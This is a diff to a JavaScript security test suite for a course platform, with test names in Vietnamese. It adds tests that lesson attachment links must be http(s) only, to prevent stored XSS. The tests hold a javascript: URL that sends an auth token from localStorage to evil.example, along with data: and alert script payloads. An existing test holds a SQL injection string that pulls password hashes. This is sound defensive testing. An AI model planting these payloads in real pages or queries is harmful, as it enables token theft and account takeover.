@@ -5,7 +5,9 @@ const crypto  = require('crypto');
 const jwt     = require('jsonwebtoken');
 const request = require('supertest');
 const app     = require('../src/app');
-const { pool, resetDb, createUser, authHeader, DEFAULT_PASSWORD } = require('./helpers');
+const {
+  pool, resetDb, createUser, authHeader, DEFAULT_PASSWORD, createCourse, createLesson, enroll,
+} = require('./helpers');
 
 beforeAll(resetDb);
 afterAll(() => pool.end());
@@ -109,6 +111,48 @@ describe('SQL injection', () => {
     const res = await request(app).get('/api/courses').query({ search: "%' UNION SELECT password_hash FROM users -- " });
     expect(res.status).toBe(200);
     expect(JSON.stringify(res.body)).not.toMatch(/\$2[aby]\$/);
+  });
+});
+
+describe('Link tài liệu bài học — chỉ http(s) (chống stored XSS qua javascript:)', () => {
+  const XSS = "javascript:fetch('https://evil.example/?t='+localStorage.getItem('hoisted.auth'))";
+  let teacher; let course; let lesson;
+  beforeAll(async () => {
+    teacher = await createUser({ role: 'INSTRUCTOR' });
+    course = await createCourse({ instructor: teacher });
+    lesson = await createLesson(course.id);
+  });
+  const urlOf = async () => (await pool.query('SELECT attachment_url FROM lessons WHERE id = ?', [lesson.id]))[0][0].attachment_url;
+
+  it.each([XSS, 'JaVaScRiPt:alert(1)', 'data:text/html,<script>alert(1)</script>', 'không-phải-url', 42])(
+    'giảng viên sửa bài học với %p → 400, không lưu', async (attachmentUrl) => {
+      const res = await request(app).put(`/api/instructor/lessons/${lesson.id}`).set(authHeader(teacher)).send({ attachmentUrl });
+      expect(res.status).toBe(400);
+      expect(await urlOf()).toBeNull();
+    },
+  );
+
+  it('giảng viên tạo bài học với link javascript: → 400', async () => {
+    const res = await request(app).post(`/api/instructor/courses/${course.id}/lessons`).set(authHeader(teacher))
+      .send({ title: 'Bài có link độc', attachmentUrl: XSS });
+    expect(res.status).toBe(400);
+  });
+
+  it('link https hợp lệ được lưu; chuỗi rỗng gỡ link', async () => {
+    const ok = 'https://developer.mozilla.org/en-US/docs/Web/JavaScript';
+    expect((await request(app).put(`/api/instructor/lessons/${lesson.id}`).set(authHeader(teacher)).send({ attachmentUrl: ok })).status).toBe(200);
+    expect(await urlOf()).toBe(ok);
+    expect((await request(app).put(`/api/instructor/lessons/${lesson.id}`).set(authHeader(teacher)).send({ attachmentUrl: '' })).status).toBe(200);
+    expect(await urlOf()).toBeNull();
+  });
+
+  it('dòng cũ đã lưu link javascript: không bao giờ được trả cho học viên', async () => {
+    const student = await createUser();
+    await enroll(student, course.id);
+    await pool.query('UPDATE lessons SET attachment_url = ? WHERE id = ?', [XSS, lesson.id]);
+    const res = await request(app).get(`/api/lessons/${lesson.id}/attachment`).set(authHeader(student));
+    expect(res.status).toBe(404);
+    expect(JSON.stringify(res.body)).not.toContain('javascript');
   });
 });
 
